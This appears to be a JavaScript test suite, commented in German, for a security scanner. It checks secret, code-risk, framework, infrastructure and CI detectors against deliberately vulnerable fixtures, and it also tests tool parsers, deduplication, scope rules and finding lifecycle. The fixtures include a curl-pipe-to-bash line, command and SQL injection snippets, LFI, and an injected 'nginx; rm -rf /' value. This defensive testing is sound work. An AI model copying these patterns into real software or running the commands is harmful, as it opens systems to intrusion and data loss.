'use strict';

// Einfache Test-Suite ohne Framework: prueft die Finder gegen verwundbare Beispiele.
// Start: npm test

const { prescan } = require('../src/core/prescan');
const { cvssFromVector } = require('../src/core/cve');
const { parseOsv, parseGrype, parseTrufflehog, parseBandit } = require('../src/core/tools');
const { estimateCost, isLocalProvider } = require('../src/core/cost');
const { toSarif } = require('../src/core/report');
const { fingerprint, atOrAbove, dedupeFindings } = require('../src/core/schema');
const { makeMatcher } = require('../src/core/ignore');
const { analyzeBinary, detectType } = require('../src/core/binaryaudit');

let pass = 0, fail = 0;
function check(name, cond) {
  if (cond) { pass++; console.log('  ok   ' + name); }
  else { fail++; console.log('  FAIL ' + name); }
}

// --- Fixtures (absichtlich verwundbar) ---------------------------------
const units = [
  {
    label: 'app.js', content: `
      const key = "AKIAIOSFODNN7EXAMPLE";
      const stripe = "sk_live_abcd1234567890WXYZ";
      const gh = "github_pat_11ABCDEFG012345678_abcdefghijklmnopqrstuvwxyz";
      const conn = "https://admin:pa55word@db.example.com/x";
      const { exec } = require('child_process'); exec("ls " + userInput);
      el.innerHTML = data;
      const q = "SELECT * FROM u WHERE id=" + id;
      const win = new BrowserWindow({ webPreferences: { nodeIntegration: true, contextIsolation: false } });
      crypto.createCipher('aes-256-ecb', k);
      const t = jwt.verify(tok, { algorithms: ['none'] });
      res.redirect(req.query.next);
    `,
  },
  {
    label: 'settings.py', content: `
SECRET_KEY = 'hardcoded-supersecret-123'
DEBUG = True
import subprocess
subprocess.run(cmd, shell=True)
db = {"$where": "this.a == b"}
`,
  },
  {
    label: 'frameworks.txt', content: `
      http.csrf().disable();
      @CrossOrigin(origins = "*")
      new ProcessBuilder("sh");
      template.HTML(userInput)
      s = "<b>".html_safe
      User.where("name = #{params[:n]}")
      skip_before_action :verify_authenticity_token
      params.permit!
      mysqli_query($c, "SELECT * FROM u WHERE id=" . $_GET['id']);
      include($_GET['page']);
      var cmd = new SqlCommand("select " + x);
      new BinaryFormatter();
      Html.Raw(model.x)
      mark_safe(data)
      Post.objects.raw("select 1")
      @csrf_exempt
      ALLOWED_HOSTS = ['*']
      jwt.sign(payload, 'mysecretkey')
      hook = "https://hooks.slack.com/services/T000/B000/abcdefghij1234567890"
    `,
  },
  {
    label: 'infra.txt', content: `
FROM node:latest
USER root
ENV API_KEY=supersecretvalue
RUN curl http://x | bash
privileged: true
allowPrivilegeEscalation: true
hostNetwork: true
runAsUser: 0
image: app:latest
roleRef: cluster-admin
      - SYS_ADMIN
cidr_blocks = ["0.0.0.0/0"]
acl = "public-read"
publicly_accessible = true
storage_encrypted = false
on: pull_request_target
run: echo \${{ github.event.issue.title }}
permissions: write-all
`,
  },
  { label: 'package.json', content: JSON.stringify({ dependencies: { lodash: '4.17.0' } }) },
  { label: 'secrets.conf', content: 'apiSecret = "aZ3kP9qXr7vB2mL5nW8cE1tY6uI0oD4sFhG7jK2pQ"' },
  { label: 'config/id_rsa', content: 'placeholder' },
  { label: 'app/.env', content: 'FOO=1' },
  { label: 'db/backup.sql', content: 'select 1' },
];

const pre = prescan(units);
const findingTitles = pre.findings.map((f) => f.title);
const hasFinding = (s) => findingTitles.some((t) => t.includes(s));
const patternNames = Object.values(pre.patternSummary).map((p) => p.name).join(' | ');
const hasPattern = (s) => patternNames.includes(s);

console.log('Secret-Finder:');
check('AWS Access Key', hasFinding('AWS Access Key'));
check('Stripe Secret Key', hasFinding('Stripe Secret'));
check('GitHub Fine-grained Token', hasFinding('GitHub Fine-grained'));
check('Zugangsdaten in URL', hasFinding('Zugangsdaten in URL'));

console.log('Code-Risiko-Muster:');
check('Shell-Ausfuehrung', hasPattern('Shell-Ausfuehrung'));
check('SQL-Konkatenation', hasPattern('SQL-Konkatenation'));
check('DOM-HTML (XSS)', hasPattern('DOM-HTML'));
check('Electron nodeIntegration', hasPattern('nodeIntegration'));
check('Electron contextIsolation', hasPattern('contextIsolation'));
check('createCipher', hasPattern('createCipher'));
check('Schwache Chiffre (ECB)', hasPattern('Schwache Chiffre'));
check('JWT none', hasPattern('JWT-Algorithmus'));
check('SECRET_KEY hartkodiert', hasPattern('SECRET_KEY'));
check('shell=True', hasPattern('shell=True'));
check('NoSQL $where', hasPattern('$where'));
check('Open Redirect', hasPattern('Open Redirect'));

console.log('Framework-Finder:');
check('Spring CSRF disabled', hasPattern('CSRF deaktiviert'));
check('Spring CORS Wildcard', hasPattern('CORS-Wildcard'));
check('Java ProcessBuilder', hasPattern('ProcessBuilder'));
check('Go template.HTML', hasPattern('template.HTML'));
check('Rails html_safe', hasPattern('html_safe'));
check('Rails where-Interpolation', hasPattern('SQL-Interpolation in where'));
check('Rails skip CSRF', hasPattern('CSRF-Schutz uebersprungen'));
check('Rails permit!', hasPattern('Mass Assignment'));
check('PHP Eingabe in Query', hasPattern('Eingabe in Query'));
check('PHP LFI/RFI', hasPattern('LFI/RFI'));
check('.NET SqlCommand', hasPattern('SqlCommand mit Konkatenation'));
check('.NET BinaryFormatter', hasPattern('BinaryFormatter'));
check('.NET Html.Raw', hasPattern('Html.Raw'));
check('Django mark_safe', hasPattern('mark_safe'));
check('Django raw/extra', hasPattern('raw/extra SQL'));
check('Django csrf_exempt', hasPattern('csrf_exempt'));
check('Django ALLOWED_HOSTS *', hasPattern('ALLOWED_HOSTS Wildcard'));
check('Hartkodiertes JWT-Secret', hasPattern('Hartkodiertes JWT-Secret'));
check('Slack Webhook', hasFinding('Slack Webhook'));

console.log('Infrastruktur-Finder:');
check('Docker :latest', hasPattern('unpinntes Basis-Image'));
check('Docker USER root', hasPattern('laeuft als root (USER root)'));
check('Docker Secret in ENV', hasPattern('Secret in ENV/ARG'));
check('Pipe nach Shell', hasPattern('Pipe nach Shell'));
check('Container privileged', hasPattern('Container: privileged'));
check('K8s PrivilegeEscalation', hasPattern('Privilege Escalation'));
check('K8s Host-Namespace', hasPattern('Host-Namespace'));
check('K8s runAsUser 0', hasPattern('laeuft als root (runAsNonRoot'));
check('K8s cluster-admin', hasPattern('cluster-admin'));
check('K8s Capabilities', hasPattern('gefaehrliche Capabilities'));
check('Image :latest', hasPattern('Container-Image :latest'));
check('0.0.0.0/0 offen', hasPattern('Offen fuers Internet'));
check('Bucket public-read', hasPattern('Bucket oeffentlich'));
check('DB publicly_accessible', hasPattern('publicly_accessible'));
check('encrypted=false', hasPattern('Verschluesselung deaktiviert'));
check('CI pull_request_target', hasPattern('pull_request_target'));
check('CI untrusted github.event', hasPattern('untrusted github.event'));
check('CI write-all', hasPattern('permissions write-all'));

console.log('Methoden (Entropie / Datei-Audit):');
check('Hohe-Entropie-Secret', hasFinding('hohe Entropie'));
check('Privater Schluessel (id_rsa)', hasFinding('Privater Schluessel'));
check('Zugangsdaten-Datei (.env)', hasFinding('Zugangsdaten-Datei'));
check('Datenbank-Dump (.sql)', hasFinding('Datenbank-Dump'));

console.log('Dependencies:');
check('lodash@4.17.0 geparst', pre.deps.some((d) => d.name === 'lodash' && d.version === '4.17.0'));

console.log('CVSS-Rechner:');
check('CVSS 9.8', cvssFromVector('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H') === 9.8);
check('CVSS ~3.1', cvssFromVector('CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N') === 3.1);
check('CVSS 0 ohne Impact', cvssFromVector('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N') === 0);
check('CVSS v2 ignoriert (null)', cvssFromVector('AV:N/AC:L/Au:N/C:P/I:P/A:P') === null);

console.log('osv-scanner (Parser):');
const osvFixture = {
  results: [{
    source: { path: 'package-lock.json', type: 'lockfile' },
    packages: [{
      package: { name: 'lodash', version: '4.17.11', ecosystem: 'npm' },
      vulnerabilities: [{
        id: 'GHSA-jf85-cpcp-j695',
        aliases: ['CVE-2019-10744'],
        summary: 'Prototype Pollution in lodash',
        affected: [{ ranges: [{ events: [{ introduced: '0' }, { fixed: '4.17.12' }] }] }],
        database_specific: { severity: 'CRITICAL' },
      }],
      groups: [{ ids: ['GHSA-jf85-cpcp-j695'], max_severity: '9.1' }],
    }],
  }],
};
const osvFindings = parseOsv(osvFixture, 'proj');
check('osv: ein Befund erzeugt', osvFindings.length === 1);
check('osv: Severity aus CVSS (critical)', osvFindings[0] && osvFindings[0].severity === 'critical');
check('osv: Kategorie Dependencies', osvFindings[0] && osvFindings[0].category === 'Dependencies');
check('osv: CVE im Titel', osvFindings[0] && osvFindings[0].title.includes('CVE-2019-10744'));
check('osv: behobene Version in Remediation', osvFindings[0] && osvFindings[0].remediation.includes('4.17.12'));
check('osv: leere Ergebnisse -> keine Befunde', parseOsv({ results: [] }, 'proj').length === 0);

console.log('grype (Parser):');
const grypeF = parseGrype({ matches: [{
  vulnerability: { id: 'GHSA-abc', severity: 'Critical', fix: { versions: ['1.2.4'], state: 'fixed' } },
  artifact: { name: 'left-pad', version: '1.0.0', type: 'npm', locations: [{ path: 'package-lock.json' }] },
}] }, 'proj');
check('grype: ein Befund', grypeF.length === 1);
check('grype: Severity critical', grypeF[0] && grypeF[0].severity === 'critical');
check('grype: Kategorie Dependencies', grypeF[0] && grypeF[0].category === 'Dependencies');
check('grype: Fix-Version in Remediation', grypeF[0] && grypeF[0].remediation.includes('1.2.4'));

console.log('trufflehog (Parser):');
const thF = parseTrufflehog('{"DetectorName":"AWS","Verified":true,"Redacted":"AKIA...","SourceMetadata":{"Data":{"Filesystem":{"file":"a.env","line":3}}}}', 'proj');
check('trufflehog: ein Befund', thF.length === 1);
check('trufflehog: verifiziert -> critical', thF[0] && thF[0].severity === 'critical');
check('trufflehog: Kategorie Secrets', thF[0] && thF[0].category === 'Secrets');
check('trufflehog: Ort mit Zeile', thF[0] && thF[0].location === 'a.env:3');

console.log('bandit (Parser):');
const banF = parseBandit({ results: [{
  test_id: 'B602', test_name: 'subprocess_popen_with_shell_equals_true', issue_severity: 'HIGH',
  issue_confidence: 'HIGH', issue_text: 'subprocess call with shell=True', filename: 'a.py', line_number: 5, more_info: 'http://x',
}] }, 'proj');
check('bandit: ein Befund', banF.length === 1);
check('bandit: Severity high', banF[0] && banF[0].severity === 'high');
check('bandit: Ort mit Zeile', banF[0] && banF[0].location === 'a.py:5');

console.log('Kosten-/Token-Schätzung:');
const cA = estimateCost({ provider: 'anthropic', model: 'claude-opus-5-5', inputTokens: 1e6, outputTokens: 1e6 });
check('cost: Opus 5.5 = $24 / 2M Tokens', cA.priced === true && cA.usd === 24);
check('cost: nicht lokal', cA.local === false);
const cO = estimateCost({ provider: 'ollama', model: 'qwen2.5-coder', inputTokens: 1000, outputTokens: 1000 });
check('cost: Ollama lokal & kostenlos', cO.local === true && cO.usd === 0 && cO.priced === false);
const cU = estimateCost({ provider: 'anthropic', model: 'unbekanntes-modell', inputTokens: 1000, outputTokens: 1000 });
check('cost: unbekanntes Modell -> keine $-Schätzung', cU.priced === false && cU.local === false);
check('cost: compat localhost = lokal', isLocalProvider('compat', 'http://localhost:1234/v1') === true);
check('cost: compat Cloud = nicht lokal', isLocalProvider('compat', 'https://api.mistral.ai/v1') === false);

console.log('SARIF-Export:');
const sres = { findings: [
  { title: 'A', severity: 'critical', category: 'Secrets', location: 'a.js:5', description: 'd', cvss: 9, confidence: 'high', source: 'ai' },
  { title: 'B', severity: 'medium', category: 'Config', location: 'b.yml:2' },
  { title: 'C', severity: 'info', category: 'Other', location: '' },
], summary: {}, meta: {} };
const sarif = JSON.parse(toSarif(sres));
check('sarif: Version 2.1.0', sarif.version === '2.1.0');
check('sarif: 3 results', sarif.runs[0].results.length === 3);
check('sarif: critical -> error', sarif.runs[0].results[0].level === 'error');
check('sarif: medium -> warning', sarif.runs[0].results[1].level === 'warning');
check('sarif: info -> note', sarif.runs[0].results[2].level === 'note');
check('sarif: Ort/Zeile geparst', sarif.runs[0].results[0].locations[0].physicalLocation.region.startLine === 5);
check('sarif: Regeln vorhanden', Array.isArray(sarif.runs[0].tool.driver.rules) && sarif.runs[0].tool.driver.rules.length >= 1);

console.log('Fingerprint:');
const fpA = fingerprint({ category: 'Secrets', location: 'a.js:5', title: 'X' });
const fpB = fingerprint({ category: 'Secrets', location: 'a.js:5', title: 'X' });
const fpC = fingerprint({ category: 'Secrets', location: 'b.js:9', title: 'X' });
check('fingerprint: stabil', fpA === fpB);
check('fingerprint: ortsabhängig', fpA !== fpC);

console.log('Duplikate zusammenfuehren:');
{
  const F = (o) => ({ severity: 'medium', category: 'Other', confidence: 'medium', cvss: null, description: '', reachability: '', impact: '', remediation: '', patch: '', ...o });
  const d = dedupeFindings([
    F({ title: 'Moegliches Secret im Klartext: AWS Access Key ID', category: 'Secrets', severity: 'high', location: 'src/app.js:2', source: 'prescan' }),
    F({ title: 'gitleaks: aws-access-token', category: 'Secrets', severity: 'high', location: 'C:\\proj\\src\\app.js:2', source: 'gitleaks', remediation: 'Schluessel rotieren und aus dem Code entfernen.' }),
    F({ title: 'Verwundbare Abhaengigkeit: lodash 4.17.15 (CVE-2020-8203)', category: 'Dependencies', location: 'npm: lodash@4.17.15', source: 'osv', cvss: 7.4 }),
    F({ title: 'trivy: lodash@4.17.15 (CVE-2020-8203)', category: 'Dependencies', severity: 'high', location: 'package-lock.json', source: 'trivy' }),
    F({ title: 'SQL-Injection in getUser', category: 'Injection', severity: 'critical', location: 'db.js:40', source: 'ai' }),
    F({ title: 'SQL Injection in getUser()', category: 'Injection', severity: 'high', location: 'db.js line 41', source: 'ai', patch: 'db.query("... WHERE id = ?", [id])' }),
    F({ title: 'Command Injection ueber exec', category: 'Injection', severity: 'high', location: 'db.js:90', source: 'ai' }),
    F({ title: 'Hartkodiertes Passwort', category: 'Secrets', location: 'db.js:40', source: 'ai' }),
  ]);
  check('dedupe: 8 -> 5 Befunde', d.length === 5);
  const sec = d.find((f) => f.category === 'Secrets' && f.sources.includes('gitleaks'));
  check('dedupe: Secret aus prescan+gitleaks vereint', sec && sec.sources.length === 2 && /rotieren/.test(sec.remediation));
  const dep = d.find((f) => f.category === 'Dependencies');
  check('dedupe: CVE ueber Tools vereint, hoechster Grad + CVSS', dep && dep.severity === 'high' && dep.cvss === 7.4);
  const sql = d.find((f) => /SQL/.test(f.title));
  check('dedupe: KI-Doppel (Zeile +-1) vereint, kritisch bleibt', sql && sql.severity === 'critical' && !!sql.patch);
  check('dedupe: andere Kategorie gleiche Zeile bleibt getrennt', d.some((f) => f.title === 'Hartkodiertes Passwort'));
  check('dedupe: Einzelbefund behaelt sources', d.every((f) => Array.isArray(f.sources) && f.sources.length >= 1));
}

console.log('Duplikate bei Web-Zielen (KI-Freitext + Sammel-Befunde):');
{
  const { normalizeFinding: nf } = require('../src/core/schema');
  const W = (title, location, source, severity = 'low', category = 'Config') => nf({ title, location, severity, category }, source);
  const raw = [
    W('Fehlende HTTP-Sicherheits-Header (HSTS, CSP, X-Content-Type-Options, X-Frame-Options)', 'https://shop.example - HTTP-Response-Header der 301-Antwort', 'ai', 'medium'),
    W('Content-Security-Policy fehlt', 'https://www.shop.example/de', 'webscan', 'medium'),
    W('Fehlende Security-Header in HTTP-Antwort', 'https://shop.example (301-Antwort, Response-Header)', 'ai'),
    W('Fehlende HTTP-Sicherheits-Header (HSTS, CSP, X-Content-Type-Options etc.)', 'https://shop.example - Response-Header der 301-Antwort', 'ai', 'low', 'Transport'),
    W('Fehlende HTTP Strict-Transport-Security (HSTS)', 'https://shop.example - Response-Header (301 Redirect)', 'ai', 'low', 'Transport'),
    W('Server-Banner gibt Software-Typ preis', "https://shop.example - Header 'server: nginx'", 'ai', 'low', 'Logging'),
    W('Clickjacking-Schutz fehlt', 'https://www.shop.example/de', 'webscan'),
    W('Server-Banner offengelegt (nginx)', 'https://shop.example - Header', 'ai', 'info', 'Logging'),
    W('Server-Banner offenbart eingesetzte Software (nginx)', 'https://shop.example -> Response-Header', 'ai', 'info'),
    W('Offener Port 80/http', 'shop.example:80', 'nmap', 'info'),
    W('Offener Port 443/ssl/http', 'shop.example:443', 'nmap', 'info'),
    W('Content-Security-Policy fehlt', 'https://other.example/', 'webscan', 'medium'),
  ];
  const d = dedupeFindings(raw);
  const t = (re) => d.filter((f) => re.test(f.title));
  check('web-dedupe: 12 -> 7 Befunde', d.length === 7);
  check('web-dedupe: CSP pro Host genau einmal', t(/Content-Security-Policy fehlt/).length === 2);
  check('web-dedupe: Banner fuenffach -> einmal', t(/Banner/).length === 1);
  check('web-dedupe: Sammel-Befund nur mit Rest-Header', t(/X-Content-Type-Options/).length === 1 && !d.some((f) => /HSTS, CSP/.test(f.title)));
  check('web-dedupe: KI als zusaetzliche Quelle bei CSP', d.find((f) => /Content-Security/.test(f.title) && /shop/.test(f.location)).sources.includes('ai'));
  check('web-dedupe: Ports gebuendelt', t(/^Offene Ports: 80\/http, 443/).length === 1);
  check('web-dedupe: Ort ohne KI-Freitext', d.every((f) => !/\s/.test(f.location)) && d.some((f) => f.locationDetail));
}

console.log('.vigilignore (Matcher):');
const m = makeMatcher(['*.log', 'node_modules/', '**/*.min.js', '# kommentar', 'secrets.txt']);
check('ignore: *.log trifft Basenamen', m('src/app.log', 'app.log') === true);
check('ignore: **/*.min.js', m('a/b/c.min.js', 'c.min.js') === true);
check('ignore: node_modules', m('node_modules', 'node_modules') === true);
check('ignore: Nicht-Treffer', m('src/app.js', 'app.js') === false);

console.log('Binary-Analyse:');
const pe = Buffer.concat([Buffer.from([0x4d, 0x5a]), Buffer.from(' VirtualAlloc WriteProcessMemory CreateRemoteThread LoadLibraryA ', 'ascii')]);
check('binary: detectType PE', detectType(pe).includes('PE'));
const bf = analyzeBinary(pe, 'mal.exe');
check('binary: API-Häufung -> Befund', bf.length >= 1 && /API-Aufrufe/.test(bf[0].title));
check('binary: Quelle = binary', bf[0] && bf[0].source === 'binary');
check('binary: harmlos -> kein Befund', analyzeBinary(Buffer.from('AAAAAAAAAAAAAAAAAAAA', 'ascii'), 'plain.bin').length === 0);

console.log('Eigene Regeln / Regeln deaktivieren:');
const preC = prescan([{ label: 'x', content: 'tok ACME-123456 und AKIAIOSFODNN7EXAMPLE' }], {
  customSecrets: [{ name: 'Acme', regex: 'ACME-[0-9]{6}', severity: 'high' }],
  disabledRules: ['AWS Access Key ID'],
});
check('eigene Regel trifft', preC.findings.some((f) => f.title.includes('Acme')));
check('eigene Regel Severity high', preC.findings.some((f) => f.title.includes('Acme') && f.severity === 'high'));
check('deaktivierte Regel greift nicht', !preC.findings.some((f) => f.title.includes('AWS Access Key')));

console.log('CLI --fail-on (atOrAbove):');
const cc = { critical: 1, high: 2, medium: 3, low: 0, info: 5 };
check('atOrAbove high = 3', atOrAbove(cc, 'high') === 3);
check('atOrAbove critical = 1', atOrAbove(cc, 'critical') === 1);
check('atOrAbove info = alle (11)', atOrAbove(cc, 'info') === 11);
check('atOrAbove unbekannt = 0', atOrAbove(cc, 'quatsch') === 0);

console.log('Harness (Schwaerzen, Slices, Gegenpruefung, Belege):');
(async () => {
  const providers = require('../src/core/providers');
  const { redactSecrets, shouldRedact, extractSlice, validateFindings, enrich } = require('../src/core/harness');

  const red = redactSecrets('const k = "AKIAIOSFODNN7EXAMPLE"; const ok = 1;');
  check('redact: AWS-Key geschwaerzt', red.count === 1 && !red.text.includes('IOSFODNN7EXAMPLE') && red.text.includes('const ok = 1'));
  check('redact: nur bei externem Anbieter', shouldRedact({ provider: 'anthropic' }) && !shouldRedact({ provider: 'ollama' }));
  check('redact: abschaltbar', !shouldRedact({ provider: 'openai', redactSecrets: false }));

  const code = Array.from({ length: 80 }, (_, i) => `line ${i + 1}`).join('\n');
  const hUnits = [{ label: 'src/routes/orders.js', content: code.replace('line 40', 'app.get("/o/:id", (req, res) => db.query("SELECT " + req.params.id))') }];
  const sl = extractSlice(hUnits, 'C:\\proj\\src\\routes\\orders.js:40', 5);
  check('slice: richtige Datei + Fenster', sl && sl.from === 35 && sl.to === 45 && /40 >/.test(sl.text));

  const F = (o) => ({ severity: 'high', category: 'Injection', confidence: 'medium', cvss: null, description: 'd', reachability: '', impact: '', remediation: '', patch: '', source: 'ai', sources: ['ai'], ...o });
  const fs3 = [
    F({ title: 'SQLi', location: 'src/routes/orders.js:40' }),
    F({ title: 'Erfunden', location: 'src/routes/orders.js:70' }),
    F({ title: 'Unklar', location: 'src/routes/orders.js:10' }),
    F({ title: 'Secret', category: 'Secrets', location: 'src/routes/orders.js:1', source: 'prescan', sources: ['prescan', 'ai'] }),
  ];
  let sent = '';
  const orig = providers.callProvider;
  providers.callProvider = async (_cfg, { user }) => {
    sent = user;
    return { text: JSON.stringify({ verdicts: [{ id: 0, verdict: 'confirmed', reason: 'Konkatenation belegt' }, { id: 1, verdict: 'refuted', reason: 'Stelle existiert nicht' }, { id: 2, verdict: 'uncertain', reason: '?' }] }), usage: { inputTokens: 10, outputTokens: 5 } };
  };
  const v = await validateFindings({ findings: fs3, units: hUnits, config: { provider: 'ollama' } });
  providers.callProvider = orig;
  check('validate: widerlegter Befund faellt raus', v.refuted.length === 1 && !v.findings.some((f) => f.title === 'Erfunden'));
  check('validate: unsicher -> confidence low', v.findings.find((f) => f.title === 'Unklar').confidence === 'low');
  check('validate: deterministische Befunde nicht gegengeprueft', !/Secret/.test(sent) && v.findings.some((f) => f.title === 'Secret'));
  check('validate: Code-Slice im Prompt', /SELECT/.test(sent));

  const en = enrich(v.findings, hUnits);
  const byT = (t) => en.find((f) => f.title === t);
  check('evidence: KI bestaetigt -> ai-verified', byT('SQLi').assurance === 'ai-verified');
  check('evidence: unsicher -> unverified', byT('Unklar').assurance === 'unverified');
  check('evidence: prescan+ai -> confirmed-multi', byT('Secret').assurance === 'confirmed-multi');
  check('context: Route -> request-handler', byT('SQLi').context.includes('request-handler'));

  console.log('Validierung, Schwaerzung, Scanner-Parser:');
  {
    const { check: zcheck, TargetSchema, ScanRequestSchema, StatusUpdateSchema } = require('../src/core/validation');
    const { redactSecret, normalizeFinding } = require('../src/core/schema');
    const { parseGitleaks, parseTrivy } = require('../src/core/tools');
    check('zod: gueltige URL ok', zcheck(TargetSchema, { type: 'url', value: 'https://a.example' }).ok);
    check('zod: URL ohne Schema abgelehnt', !zcheck(TargetSchema, { type: 'url', value: 'a.example' }).ok);
    check('zod: Image-Referenz ok', zcheck(TargetSchema, { type: 'image', value: 'ghcr.io/org/app:2.1' }).ok);
    check('zod: Image mit Shell-Zeichen abgelehnt', !zcheck(TargetSchema, { type: 'image', value: 'nginx; rm -rf /' }).ok);
    check('zod: Steuerzeichen abgelehnt', !zcheck(TargetSchema, { type: 'path', value: 'a\nb' }).ok);
    check('zod: leere Zielliste abgelehnt', !zcheck(ScanRequestSchema, { targets: [] }).ok);
    check('zod: unbekannter Status abgelehnt', !zcheck(StatusUpdateSchema, { status: 'DONE' }).ok);
    check('redact: 70 % maskiert', redactSecret('sk_live_abcdef1234567890') === 'sk_****REDACTED****890');
    check('redact: kurz -> komplett', redactSecret('abc123') === '****REDACTED****');
    const nf = normalizeFinding({ title: 'trivy: x (CVE-2024-1234)', severity: 'high', category: 'Dependencies' }, 'trivy');
    check('ruleId: CVE aus Titel', nf.ruleId === 'CVE-2024-1234');
    const gl = parseGitleaks(JSON.stringify([{ RuleID: 'aws-access-token', File: 'a.js', StartLine: 3, Secret: 'AKIAIOSFODNN7EXAMPLE' }]));
    check('gitleaks: geparst + Regel-ID', gl.length === 1 && gl[0].ruleId === 'aws-access-token');
    check('gitleaks: Klartext-Secret nie gespeichert', !JSON.stringify(gl).includes('IOSFODNN7EXAMP') && gl[0].evidence === 'AKI****REDACTED****PLE');
    check('gitleaks: kaputte Ausgabe -> null', parseGitleaks('{"oops":1}') === null);
    const tv = parseTrivy(JSON.stringify({ Results: [{ Target: 'nginx:1.25 (debian 12)', Vulnerabilities: [{ VulnerabilityID: 'CVE-2023-44487', PkgName: 'libnghttp2', InstalledVersion: '1.52', Severity: 'HIGH' }], Misconfigurations: [{ ID: 'DS002', Title: 'Image user should not be root', Severity: 'HIGH' }] }] }), 'nginx:1.25');
    check('trivy: Vuln + Misconfig', tv.length === 2 && tv[0].ruleId === 'CVE-2023-44487' && tv[1].ruleId === 'DS002');
    const { enrich: enrich2 } = require('../src/core/harness');
    const { dedupeFindings: dd } = require('../src/core/schema');
    const kept = enrich2(dd([{ ...gl[0], location: 'a.js:3' }, normalizeFinding({ title: 'Secret im Code', severity: 'critical', category: 'Secrets', location: 'a.js:3' }, 'ai')]));
    check('evidence: Fundstelle bleibt nach Merge + Anreicherung erhalten', kept.length === 1 && kept[0].evidence === 'AKI****REDACTED****PLE' && kept[0].assurance === 'confirmed-multi');
  }

  console.log('Scope-Durchsetzung:');
  {
    const { enforceScope, isInternalHost, isAllowlisted } = require('../src/core/scope');
    check('scope: Pfad immer erlaubt', enforceScope([{ type: 'path', value: 'C:\\x' }], []).ok);
    check('scope: URL ohne Freigabe abgelehnt (API)', !enforceScope([{ type: 'url', value: 'https://a.example' }], []).ok);
    check('scope: URL auf Allowlist ok', enforceScope([{ type: 'url', value: 'https://shop.a.example/x' }], ['a.example']).targets[0].authorized === true);
    const ia = enforceScope([{ type: 'endpoint', value: '192.168.1.5:8443', authorized: true }], [], { interactive: true });
    check('scope: UI-Bestaetigung gibt Host frei', ia.ok && ia.allow[0] === '192.168.1.5');
    check('scope: API ignoriert authorized-Flag', !enforceScope([{ type: 'url', value: 'https://b.example', authorized: true }], []).ok);
    check('scope: *.x nur Subdomains', isAllowlisted('a.x.example', ['*.x.example']) && !isAllowlisted('x.example', ['*.x.example']));
    check('scope: interne Adressen erkannt', isInternalHost('10.0.0.1') && isInternalHost('server.local') && !isInternalHost('8.8.8.8'));
  }

  console.log('Befund-Lebenszyklus:');
  {
    const store = require('../src/core/store');
    const db = store.emptyStore();
    const tgt = [{ type: 'path', value: 'C:\\proj' }];
    const F = (o) => ({ severity: 'high', category: 'Secrets', cvss: null, description: '', remediation: '', source: 'prescan', sources: ['prescan'], ...o });
    const a = F({ ruleId: 'secret-aws', title: 'AWS', location: 'proj/a.js:1' });
    const b = F({ ruleId: 'secret-gh', title: 'GH', location: 'proj/b.js:2' });
    const ai = F({ ruleId: 'idor', title: 'IDOR', location: 'proj/c.js:9', source: 'ai', sources: ['ai'], category: 'AccessControl' });
    const ran = [{ target: 'C:\\proj', source: 'prescan' }];
    const r1 = store.applyRun(db, { targets: tgt, findings: [a, b, ai], scannersRun: ran, now: '2026-11-01T10:00:00Z' });
    check('lifecycle: neue Befunde OPEN', r1.counters.created === 3 && r1.findings.every((f) => f.status === 'OPEN' && f.isNew));
    const idA = r1.findings[0].id, idB = r1.findings[1].id;
    check('lifecycle: Fingerabdruck SHA-256', /^[a-f0-9]{64}$/.test(idA));
    store.setStatus(db, idB, 'FALSE_POSITIVE');
    const r2 = store.applyRun(db, { targets: tgt, findings: [b], scannersRun: ran, now: '2026-11-02T10:00:00Z' });
    check('lifecycle: fehlender Befund -> RESOLVED', db.findings[idA].status === 'RESOLVED' && r2.counters.resolved === 1);
    check('lifecycle: FALSE_POSITIVE bleibt + lastSeen', db.findings[idB].status === 'FALSE_POSITIVE' && db.findings[idB].lastSeenAt === '2026-11-02T10:00:00Z' && r2.findings[0].suppressed);
    check('lifecycle: KI-Befund nicht auto-geschlossen', Object.values(db.findings).find((f) => f.ruleId === 'idor').status === 'OPEN');
    const r3 = store.applyRun(db, { targets: tgt, findings: [a, b], scannersRun: ran, now: '2026-11-03T10:00:00Z' });
    check('lifecycle: RESOLVED taucht wieder auf -> OPEN (Regression)', db.findings[idA].status === 'OPEN' && r3.findings[0].regression);
    check('lifecycle: firstSeen bleibt erhalten', db.findings[idA].firstSeenAt === '2026-11-01T10:00:00Z');
    store.applyRun(db, { targets: tgt, findings: [], scannersRun: [], now: '2026-11-04T10:00:00Z' });
    check('lifecycle: ohne vollstaendigen Lauf kein Auto-Resolve', db.findings[idA].status === 'OPEN');
    const st = store.stats(db);
    check('stats: offene nach Schweregrad', st.open.high === 2 && st.targets.length === 1);
    check('list: Statusfilter', store.listFindings(db, { status: 'FALSE_POSITIVE' }).length === 1);
  }

  console.log('Audit-Module (statisch):');
  {
    const { runStaticModules, lev1 } = require('../src/core/modules/static');
    const U = (label, content) => ({ label, content });
    const r = runStaticModules([
      U('app/package.json', JSON.stringify({ dependencies: { lodahs: '1.0.0', express: '4.17.1' }, scripts: { postinstall: 'node x.js' } })),
      U('app/docker-compose.yml', 'services:\n  db:\n    image: postgres\n    ports:\n      - "5432:5432"\n  app:\n    image: app\n    privileged: true\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n'),
      U('app/Dockerfile', 'FROM node:latest\nRUN npm ci\n'),
      U('app/.github/workflows/ci.yml', 'on: pull_request_target\npermissions: write-all\njobs:\n  b:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af\n'),
      U('app/src/pay.js', 'const resetToken = Math.random().toString(36);\nif (req.headers.signature === expected) {}\nconst p = jwt.decode(t);\nawait prisma.user.update({ data: req.body });\nawait fetch(req.query.url);\nconst sys = `Du bist hilfreich. ${req.body.msg}`;\neval(completion.text);\n'),
      U('etc/ssh/sshd_config', 'PermitRootLogin yes\nPasswordAuthentication no\n'),
      U('app/safe.js', 'const t = crypto.randomBytes(32);\nif (timingSafeEqual(a, b)) {}\njwt.verify(t, k);\n'),
    ]);
    const ids = new Set(r.findings.map((f) => f.ruleId));
    check('static: alle 10 Module gelaufen', r.ran.length === 10 && !r.errors.length);
    check('static: Typosquat (vertauscht) erkannt', ids.has('typosquat-suspect') && lev1('lodahs', 'lodash') && !lev1('react', 'redux'));
